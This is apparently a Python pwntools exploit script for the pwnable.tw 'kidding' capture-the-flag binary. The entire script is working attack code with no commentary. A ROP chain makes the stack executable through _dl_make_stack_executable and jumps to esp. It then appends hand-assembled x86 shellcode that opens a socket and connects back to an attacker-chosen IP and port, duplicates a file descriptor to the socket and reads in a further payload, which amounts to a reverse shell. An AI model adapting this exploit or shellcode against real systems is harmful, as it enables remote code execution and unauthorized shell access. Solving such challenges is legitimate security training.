from pwn import *

sln = lambda data: p.sendline(data)


elf = context.binary = ELF('kidding')


KERNEL_SYSCALL = 0x0806dd52
LIBC_STACK_END = 0x80e9fc8
STACK_PROC = 0x80e9fec
POP_EDX = 0x0806ec8b #: pop edx ; ret
POP_EAX = 0x080b8536 #: pop eax ; ret
MOV_PEAX_EDX = 0x0808b62f # : mov dword ptr [eax], edx ; mov dword ptr [eax + 8], edx ; mov dword ptr [eax + 0x20], ecx ; ret
PREPARE_EAX_SYSCALL = 0x0806dd4d
JMP_ESP = 0x080bd13b #: jmp esp



port = 4444
ip = '127.0.0.1'

ip = u32(binary_ip(ip))
port = int.from_bytes(p16(port))


print('ip: {}'.format(hex(ip)))
print('port: {}'.format(hex(port)))
#p = remote('chall.pwnable.tw', 10303) #nc chall.pwnable.tw 10303
p = process()
#gdb.attach(p, gdbscript='''break *0x080488b6''')


payload = flat(
    b'A'*8,
    ip, # ebp
    POP_EAX,
    STACK_PROC,
    POP_EDX,
    7,
    MOV_PEAX_EDX,
    POP_EAX,
    LIBC_STACK_END,
    elf.symbols['_dl_make_stack_executable'],
    JMP_ESP
)

reverse_shell = asm('''
                    push 2
                    pop ebx
                    push 1
                    pop ecx 
                    push eax
                    pop edx
                    mov ax, 0x167 
                    int 0x80


                    
                    mov edi, eax
                    push ebp
                    push  {}0002
                    mov ecx, esp
                    mov ebx, edi
                    mov dl, 0x10
                    mov ax, 0x16a
                    int 0x80


                    mov al, 0x3f
                    xor ecx, ecx
                    int 0x80

                    mov al, 0x3
                    mov ecx, esp
                    mov ebx, edi
                    mov dx, 0x200
                    int 0x80
                    '''.format(hex(port)))


payload += reverse_shell
print('payload len: {}'.format(len(payload)))
sln(payload)


p.interactive()
